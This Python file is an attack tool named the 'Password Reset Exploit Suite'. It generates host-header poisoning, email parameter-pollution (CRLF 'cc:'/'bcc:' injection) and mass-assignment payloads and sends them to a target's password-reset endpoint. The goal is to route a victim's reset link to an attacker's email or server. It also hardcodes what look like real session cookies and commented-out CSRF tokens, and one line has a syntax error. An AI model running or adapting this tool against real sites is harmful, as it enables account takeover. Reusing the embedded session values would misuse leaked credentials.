import requests
import argparse
import json
import time
import tldextract
from more_itertools import batched
import logging
from progress.bar import Bar
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


logging.getLogger("requests").setLevel(logging.WARNING)

parser=argparse.ArgumentParser(description='### Password Reset Exploit Suite ###', prog="Junkie", )

parser.add_argument('-u', '--url', required=True, help="Target url", dest="url")
parser.add_argument('-pf', '--parameter-file', required=False, type=argparse.FileType('r'), help="Mass Assignment parameter file (default=false)", dest="paramFile")
parser.add_argument('-s', '--server-url', required=True, help="Server link for host poisoning", dest="server")
parser.add_argument('-v', '--victim', required=True, help="Victim's mail", dest="vmail")
parser.add_argument('-a', '--attacker', required=True, help="Attacker's mail", dest="amail")
parser.add_argument('-p', '--parameter', required=True, help="Parameter", dest="parameter")
parser.add_argument('-l', '--log-file', required=False, help="Log file path", dest="logFile")
parser.add_argument('--options', dest='options', help="Options: all/test/mass/header/hpp", choices=["all","test","mass","header","hpp"])
parser.add_argument('--json', dest='paramType', help="Data type json", action='store_true')
parser.add_argument('--text', dest='paramType', help="Data type text", action='store_false')
parser.add_argument('--get', action='store_false',help="HTTP Method get", dest="method")
parser.add_argument('--post', action='store_true',help="HTTP Method post", dest="method")

args = parser.parse_args()




def logger(type,message):
    
    if args.logFile == None: return
    logFile=args.logFile
    
    logging.basicConfig(filename=logFile,
                    format='%(asctime)s - %(process)d - [%(levelname)s] - %(message)s',
                    filemode='a',
                    level=logging.INFO
                    )
    
    logger = logging.getLogger()
    
    
    if type=="warn":
        logger.warning(message)
    elif type=="error":
        logger.error(message)
    elif type=="info":
        logger.info(message)
    elif type=="response":
        with open(logFile,"a+") as logfile:
            logfile.write(message)

    return
logger("a","a")
def createHeader(domain):
    payloadList= list()
    headerList= [
        "Host: ",
        "X-Forwarded-For: ",
        "X-Forwarded-Host: ",
        "Referer: ",
        "Origin: "
    ]
    for header in headerList:
        payload= header+domain
        if "Referer" in header: payload=header+"https://"+domain
        payloadList.append(payload)
    return payloadList

def caseHeader():
    server=args.server
    payloadList= list()
    target = tldextract.extract(args.url)
    payloadList.extend(createHeader(server))
    
    if target.subdomain != "":
        payloadList.extend(createHeader(target.subdomain+"x"+target.domain+"."+target.suffix))
        payloadList.extend(createHeader(target.subdomain+"."+target.domain+"."+target.suffix+"."+server))
        payloadList.extend(createHeader(server+"/"+target.subdomain+"."+target.domain+"."+target.suffix))
    else:
        payloadList.extend(createHeader(target.domain+"."+target.suffix+"."+server))
        payloadList.extend(createHeader(server+"/"+target.domain+"."+target.suffix))
    logger("info","Header Explotation case's payloads are generated")
    return payloadList

def caseParameter():
    data= json.loads(args.parameter)
    injectParam=list(data.keys())[list(data.values()).index("victim")]
    attackerParam=injectParam+"l"
    vmail= args.vmail
    amail= args.amail
    payloadList = list()

    seperatorList= [
        "",
        ",",
        ";",
        "%00",
        "%0Acc:",
        "%0Abcc:",
        "%0D%0Acc:",
        "%0D%0Abcc:",
        "\\r\\n \\ncc: "
    ]

    for seperator in seperatorList:
        data[attackerParam]=vmail+seperator+amail
        data[injectParam]=vmail
        payload1=data
        data= json.loads(args.parameter)
        payload1=json.dumps(payload1).replace(attackerParam,injectParam)

        data[attackerParam]=vmail
        data[injectParam]=vmail+seperator+amail
        payload2=data
        data= json.loads(args.parameter)
        payload2=json.dumps(payload2).replace(attackerParam,injectParam)
        payloadList.append(payload1)
        payloadList.append(payload2)
    
    
    data[injectParam]=vmail+","+amail
    payload3=data
    data= json.loads(args.parameter)
    payload3=json.dumps(payload3)
    payloadList.append(payload3)

    data[injectParam]=[vmail,amail]
    payload4=data
    data= json.loads(args.parameter)
    payload4=json.dumps(payload4)
    payloadList.append(payload4)

    data[injectParam]=[amail,vmail]
    payload5=data
    data= json.loads(args.parameter)
    payload5=json.dumps(payload5)
    payloadList.append(payload5)
    logger("info","Parameter Pollution case's payloads are generated")
    return payloadList

def caseMass():
    payloadList=list()
    paramList = list(args.paramFile)
    
    for i in batched(paramList,500):
        datadict={}
        #payloadList.append(i)
        for j in i:
            datadict[j[:-1]]="https://"+args.server+'/grox"<>'
        datadict[list(json.loads(args.parameter).keys())[list(json.loads(args.parameter).values()).index("victim")]]=args.vmail
        payloadList.append(json.dumps(datadict))
    logger("info","Mass Assignment case's payloads are generated")
    return  payloadList 
def sendRequest(url,header,payload):
    cookies = {"tracking_id": "addafa94-1837-4e0a-bb90-da281f8911d6", "_vwo_uuid_v2": "DC5BBDF59B89DF20AFC309B5C5AC2C4D2|0c151a6a92c37c1947ebcad2b5872831", "_ga": "GA1.2.255781912.1655466638", "amplitude_id_985eaa9c45d824a94344e64a2a3ca724browserstack.com": "eyJkZXZpY2VJZCI6ImQ4MTE3MjBmLTg1MzItMmRhOS1iMzJhLWFkNmIwODJiZjY5ZiIsInVzZXJJZCI6bnVsbCwib3B0T3V0IjpmYWxzZSwic2Vzc2lvbklkIjoxNjc2NzM3ODU0NTc2LCJsYXN0RXZlbnRUaW1lIjoxNjc2NzM4MDAxMzM2LCJldmVudElkIjo5NSwiaWRlbnRpZnlJZCI6NTYsInNlcXVlbmNlTnVtYmVyIjoxNTF9", "_fw_crm_v": "ecd11f9b-be91-40f0-c7e3-f9622b7d7f02", "previous_session_os": "maccat", "_session": "bd4bada6209445fca5a1f07838eff798", "bs_user_details": "{}", "_vwo_ds": "3%3Aa_0%2Ct_0%3A0%241670665959%3A44.4409602%3A%3A%3A545_0%2C431_0%2C12_0%2C5_0%2C3_0%3A1", "_fbp": "fb.1.1670667631944.2082241888", "_rdt_uuid": "1670667635786.ac165a26-9c39-478b-b7cd-b7f3a691b5e5", "show_freshchat": "0", "ab_users": "%7B%22112%22%3A245%2C%22_allocation%22%3A%229f049ce2-db7e-40f0-82ae-2c075264de4c%22%2C%2260%22%3A128%2C%2240%22%3A87%2C%2255%22%3A119%2C%22100%22%3A217%2C%22123%22%3A269%7D", "__stripe_mid": "3cde7443-d285-46d5-b9e9-9abba2003f20574ce6", "_delighted_web": "{%22uK1aMgGA2GQUXIvb%22:{%22_delighted_fst%22:{%22t%22:%221670668574975%22}%2C%22_delighted_lst%22:{%22t%22:%221670668588533%22%2C%22m%22:{%22token%22:%22ZimWH7cDuP5bQ4y6G8iyGaOW%22}}}}", "_vis_opt_s": "1%7C", "_vwo_uuid": "D9F0E0D4C629DD8692592DC735052168C", "bs_deviceId": "d811720f-8532-2da9-b32a-ad6b082bf69f", "_gid": "GA1.2.1103135580.1676735341", "_gcl_au": "1.1.1504416730.1676735355", "_vwo_sn": "6069348%3A3", "__cfruid": "1d1634fd9e3cd524481d5f155add1e63ce8c46a1-1676735276", "_vis_opt_test_cookie": "1", "GAstartTime": "1676737791914", "GAlastSentTime": "1676738001373", "__cf_bm": "nqrxqPRxKycv8pqqsX94hpW8DYS3zhn92DUVGHYFvAg-1676737788-0-AW3nwHm1yhBITTRuw2g1instqNbyDV6/YkcVHr3uh2BoD3ByyhGLaqA5UFWX8BtIZm/05GAl1qKIQe6Jiu046MI=", "startSessionHash": "#os=OS+X&os_version=Catalina&browser=Safari&browser_version=13.1&zoom_to_fit=true&full_screen=true&url=http%3A%2F%2Fwww.127.0.0.1%2F&speed=1", "p_list": "[\"live\"]", "last_visited_product_page": "live", "_fw_crm_v": "ecd11f9b-be91-40f0-c7e3-f9622b7d7f02", "__stripe_mid": "3cde7443-d285-46d5-b9e9-9abba2003f20574ce6", "ga_pa_status": "npa", "_rt_uuid": "qy4He2l9OStk_nOtRlZEX5p_r", "_rt_sid": "_4A5CnwC_vhJH66mF_t160_9y", "moved": "1", "_ga_BBS5LEDVRG": "GS1.1.1676737910.1.1.1676738001.60.0.0", "_uetsid": "ddd25ab0afa311edab3ba93225fc0930", "_uetvid": "c04785b0ee3311ecaf26111c5344eb7d", "ln_or": "eyIyMDc1MjkiOiIyMDc1MjkifQ%3D%3D", "oribili_user_guid": "d8e0c27d-9e51-1608-5c02-d505bd36c539", "_gat_browserstack": "1", "_gat": "1"}
    if args.method == True: method="post"; 
    else:  method="get"
    if args.paramType == True: paramType="json"; 
    else:  paramType="text"
    
    if header == "":
        headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0'}
        #headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0", "Accept": "*/*", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Referer": "https://try.discourse.org/u/account-created", "X-Csrf-Token": "1u4PdmTsbCQmYqkX2raTXbLTht0an9hkJuhHdQoT_HtTjHgncYX9RfjKRkDqPYvGJtpNJyf3SN7tn7Vw_r2AqA", "Discourse-Present": "true", "X-Requested-With": "XMLHttpRequest", "Origin": "https://try.discourse.org", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Te": "trailers"}
        

        if method == "get" : response= requests.get(url, params=json.loads(payload),verify=False, headers=headers) 
        if method == "post" and paramType== "json" : response= requests.post(url,json=json.loads(payload),verify=False, headers=headers)
        elif method == "post" and paramType=="text" : response= requests.post(url,data=json.loads(payload),verify=False, headers=headers) 
        return response
        #except:
        #    logger("error","Error in first parts of request")
    if payload == "":
        #header ={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0", "Accept": "*/*", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Referer": "https://try.discourse.org/u/account-created", "X-Csrf-Token": "ZiGehJBnRE5Mj2UY0ys2WScaLNx5KTAODaR-YvBMamjjQ-nVhQ7VL5Inik_joC7CsxPnJkRBoLTG04xnBOIWuw", "Discourse-Present": "true", "X-Requested-With": "XMLHttpRequest", "Origin": "https://try.discourse.org", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Te": "trailers"}
        header['User-Agent']='Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0'
        
        header[list(header.keys())[0]]=list(header.values())[0]

        try:
            if method == "get" : response= requests.get(url,headers=header, data=json.loads(args.parameter.replace("victim",args.vmail)),verify=False)
            if method == "post" and paramType== "json" : response= requests.post(url,headers=header, json=json.loads(args.parameter.replace("victim",args.vmail)),verify=False,)
            if method == "post" and paramType== "text" : response= requests.post(url,data=json.loads(args.parameter.replace("victim",args.vmail)), headers=header,verify=False)
            return response
            
        except:
            logger("error","Error in second parts of request")
    


def exploit(switch):
    if switch == 1:
        with Bar('Loading', fill='█', max=len(caseHeader()), suffix='%(percent).1f%% - %(eta_td)s') as bar:
            for headerPayload in caseHeader():
                header= {headerPayload.split(":")[0]: headerPayload.split()[1]}
                log= sendRequest(args.url,header,"")
                bar.next()
                time.sleep(2)

                logger("info","########################## response ##########################")
                logger("info","##########################"+str(log.status_code)+"##########################")
                logger("response",str(log.text)+\n)
                logger("info","########################## end ##########################")

    elif switch == 2:
        with Bar('Loading', fill='█', max=len(caseParameter()), suffix='%(percent).1f%% - %(eta_td)s') as bar:   
            for dataPayload in caseParameter():       
                log= sendRequest(args.url,"",dataPayload)
                bar.next()
                time.sleep(2)
                
                logger("info","########################## response ##########################")
                logger("info","##########################"+str(log.status_code)+"##########################")
                logger("response",str(log.text)+"\n")
                logger("info","########################## end ##########################")            

    elif switch == 3:
        params=caseMass()
        
        with Bar('Loading', fill='█', max=len(params), suffix='%(percent).1f%% - %(eta_td)s') as bar:   
            for param in params:
                log= sendRequest(args.url,"",param)
                bar.next()
                time.sleep(2)

                logger("info","########################## response ##########################")
                logger("info","##########################"+str(log.status_code)+"##########################")
                logger("response",str(log.text)+"\n")
                logger("info","########################## end ##########################")
    return


def main():
    logger("info","Program is started")
    if args.options == "all":
        logger("info","Mass Assignment is started")
        exploit(3)
        logger("info","Mass Assignment is finished")
        logger("info","Header explotation is started")
        exploit(1)
        logger("info","Header explotation is finished")
        logger("info","HTTP Parameter Pollution is started")
        exploit(2)
        logger("info","HTTP Parameter Pollution is finished")
    elif args.options == "test":
        log= sendRequest(args.url,"",args.parameter.replace("victim",args.vmail))
        logger("info","################### test ########################")
        logger("response", str(log.text)+"\n")
    elif args.options == "mass":
        logger("info","Mass Assignment is started")
        exploit(3)
        logger("info","Mass Assignment is finished")
    elif args.options == "header":
        logger("info","Header explotation is started")
        exploit(1)
        logger("info","Header explotation is finished")
    elif args.options == "hpp":
        logger("info","HTTP Parameter Pollution is started")
        exploit(2)
        logger("info","HTTP Parameter Pollution is finished")
    return
main()
